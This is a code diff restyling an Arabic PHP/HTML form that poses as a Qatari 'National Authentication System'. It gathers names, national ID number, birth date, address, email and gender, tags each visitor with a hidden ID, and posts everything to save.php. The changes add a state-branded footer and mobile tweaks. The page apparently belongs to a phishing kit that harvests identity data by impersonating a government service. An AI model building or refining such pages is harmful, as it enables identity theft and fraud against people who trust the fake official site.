@@ -23,92 +23,85 @@ try {
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>نظام التوثيق الوطني - البيانات الشخصية</title>
-    <!-- مكتبات الجنسيات والأعلام -->
     <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
 
     <style>
-        :root { --primary-color: #007fb1; --bg-color: #f5f5f5; --secondary-color: #8a1538; --input-bg: #e0e0e0; }
-        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg-color); margin: 0; padding: 0; }
-        .header { background-color: #fff; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #ddd; }
-        .container { max-width: 500px; margin: 20px auto; padding: 10px; }
-        .form-card { background: #fff; border: 1px solid #e0e0e0; border-radius: 4px; padding: 25px; }
+        :root { --primary-color: #007fb1; --secondary-color: #8a1538; --input-bg: #e0e0e0; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #ffffff; margin: 0; padding: 0; overflow-x: hidden; display: flex; flex-direction: column; min-height: 100vh; }
+        .header { background-color: #fff; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #ddd; }
+        .container { width: 92%; max-width: 500px; margin: 20px auto; padding: 10px; flex: 1; text-align: right; }
+        h2 { font-size: 20px; margin-bottom: 20px; color: #333; }
         .form-group { margin-bottom: 15px; }
-        
-        /* المربعات باللون الرمادي */
-        input, select { 
-            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; 
-            box-sizing: border-box; background-color: var(--input-bg) !important; color: #333;
-        }
-        
+        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; background-color: var(--input-bg) !important; color: #333; font-size: 15px; }
         .dob-group { display: flex; gap: 5px; }
         .gender-group { display: flex; gap: 20px; margin-top: 10px; }
-        .radio-option { display: flex; align-items: center; font-size: 14px; cursor: pointer; }
+        .radio-option { display: flex; align-items: center; font-size: 15px; cursor: pointer; }
         .radio-option input { margin-left: 8px; width: auto; }
-        .btn-submit { width: 100%; background-color: var(--primary-color); color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; }
-        
-        /* تنسيق خاص لقائمة select2 لتكون رمادية */
-        .select2-container--default .select2-selection--single { 
-            background-color: var(--input-bg) !important; height: 45px; padding-top: 8px; border: 1px solid #ccc; 
-        }
+        .btn-submit { width: 100%; background-color: var(--primary-color); color: white; border: none; padding: 14px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 17px; margin-top: 15px; }
+        .select2-container--default .select2-selection--single { background-color: var(--input-bg) !important; height: 42px; padding-top: 5px; border: 1px solid #ccc; }
+        .footer { background-color: #eeeeee; padding: 15px; text-align: center; border-top: 1px solid #cccccc; font-size: 12px; color: #555; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="header">
-        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" height="50">
-        <div style="text-align: left;">
+        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" height="40">
+        <div style="text-align: left; font-size: 14px;">
             <div style="color: var(--secondary-color); font-weight: bold;">نظام التوثيق الوطني</div>
         </div>
     </div>
 
     <div class="container">
-        <div class="form-card">
-            <h2>البيانات الشخصية</h2>
-            <form action="save.php" method="POST">
-                <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($visitor_id); ?>">
-                
-                <div class="form-group">
-                    <select id="nationality" name="nationality" class="js-example-basic-single" required>
-                        <option value="" disabled selected>اختر الجنسية</option>
-                        <option value="قطر">قطر 🇶🇦</option>
-                        <option value="السعودية">السعودية 🇸🇦</option>
-                        <option value="الإمارات">الإمارات 🇦🇪</option>
-                        <option value="الكويت">الكويت 🇰🇼</option>
-                        <option value="البحرين">البحرين 🇧🇭</option>
-                        <option value="عمان">عمان 🇴🇲</option>
-                        <option value="مصر">مصر 🇪🇬</option>
-                    </select>
+        <h2>البيانات الشخصية</h2>
+        <form action="save.php" method="POST">
+            <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($visitor_id); ?>">
+            
+            <div class="form-group">
+                <select id="nationality" name="nationality" class="js-example-basic-single" required>
+                    <option value="قطر">قطر 🇶🇦</option>
+                    <option value="السعودية">السعودية 🇸🇦</option>
+                    <option value="الإمارات">الإمارات 🇦🇪</option>
+                    <option value="الكويت">الكويت 🇰🇼</option>
+                    <option value="البحرين">البحرين 🇧🇭</option>
+                    <option value="عمان">عمان 🇴🇲</option>
+                    <option value="مصر">مصر 🇪🇬</option>
+                </select>
+            </div>
+            
+            <div class="form-group"><input type="text" name="name_ar" placeholder="الاسم بالعربي" required></div>
+            <div class="form-group"><input type="text" name="name_en" placeholder="الاسم بالإنجليزي" required></div>
+            <div class="form-group"><input type="text" name="id_number" placeholder="رقم الهوية" required></div>
+            
+            <div class="form-group">
+                <label style="font-size: 13px; font-weight: bold; margin-bottom: 5px; display: block;">تاريخ الميلاد</label>
+                <div class="dob-group">
+                    <select name="day" required><option value="">يوم</option><?php for($i=1;$i<=31;$i++) echo "<option value='$i'>$i</option>"; ?></select>
+                    <select name="month" required><option value="">شهر</option><?php $m=['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر']; foreach($m as $k=>$v) echo "<option value='".($k+1)."'>$v</option>"; ?></select>
+                    <select name="year" required><option value="">سنة</option><?php for($i=2026;$i>=1950;$i--) echo "<option value='$i'>$i</option>"; ?></select>
                 </div>
-                <div class="form-group"><input type="text" name="name_ar" placeholder="الاسم بالعربي" required></div>
-                <div class="form-group"><input type="text" name="name_en" placeholder="الاسم بالإنجليزي" required></div>
-                <div class="form-group"><input type="text" name="id_number" placeholder="رقم الهوية" required></div>
-                
-                <div class="form-group">
-                    <label style="font-size: 12px;">تاريخ الميلاد</label>
-                    <div class="dob-group">
-                        <select name="day" required><option value="">يوم</option><?php for($i=1;$i<=31;$i++) echo "<option value='$i'>$i</option>"; ?></select>
-                        <select name="month" required><option value="">شهر</option><?php $m=['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر']; foreach($m as $k=>$v) echo "<option value='".($k+1)."'>$v</option>"; ?></select>
-                        <select name="year" required><option value="">سنة</option><?php for($i=2026;$i>=1950;$i--) echo "<option value='$i'>$i</option>"; ?></select>
-                    </div>
-                </div>
+            </div>
 
-                <div class="form-group"><input type="text" name="address" placeholder="العنوان الحالي" required></div>
-                <div class="form-group"><input type="email" name="email" placeholder="البريد الإلكتروني" required></div>
-                
-                <div class="form-group">
-                    <label style="font-weight: bold; font-size: 14px;">الجنس *</label>
-                    <div class="gender-group">
-                        <label class="radio-option"><input type="radio" name="gender" value="ذكر" required> ذكر</label>
-                        <label class="radio-option"><input type="radio" name="gender" value="أنثى" required> أنثى</label>
-                    </div>
+            <div class="form-group"><input type="text" name="address" placeholder="العنوان الحالي" required></div>
+            <div class="form-group"><input type="email" name="email" placeholder="البريد الإلكتروني" required></div>
+            
+            <div class="form-group">
+                <label style="font-weight: bold; font-size: 15px;">الجنس *</label>
+                <div class="gender-group">
+                    <label class="radio-option"><input type="radio" name="gender" value="ذكر" required> ذكر</label>
+                    <label class="radio-option"><input type="radio" name="gender" value="أنثى" required> أنثى</label>
                 </div>
+            </div>
 
-                <button type="submit" class="btn-submit">استمرار</button>
-            </form>
-        </div>
+            <button type="submit" class="btn-submit">استمرار</button>
+        </form>
+    </div>
+
+    <div class="footer">
+        <p><strong>نظام التوثيق الوطني - دولة قطر</strong></p>
+        <p>جميع الحقوق محفوظة © 2026</p>
     </div>
 
     <script>
@@ -118,10 +111,10 @@ try {
             .then(response => response.json())
             .then(data => {
                 const select = $('#nationality');
+                const arabCountries = ['Qatar', 'Saudi Arabia', 'United Arab Emirates', 'Kuwait', 'Bahrain', 'Oman', 'Egypt'];
                 data.sort((a, b) => a.name.common.localeCompare(b.name.common)).forEach(country => {
-                    const name = country.name.common;
-                    if (!['Qatar', 'Saudi Arabia', 'United Arab Emirates', 'Kuwait', 'Bahrain', 'Oman', 'Egypt'].includes(name)) {
-                        select.append(`<option value="${name}">${name} ${country.flag}</option>`);
+                    if (!arabCountries.includes(country.name.common)) {
+                        select.append(`<option value="${country.name.common}">${country.name.common} ${country.flag || ''}</option>`);
                     }
                 });
             });
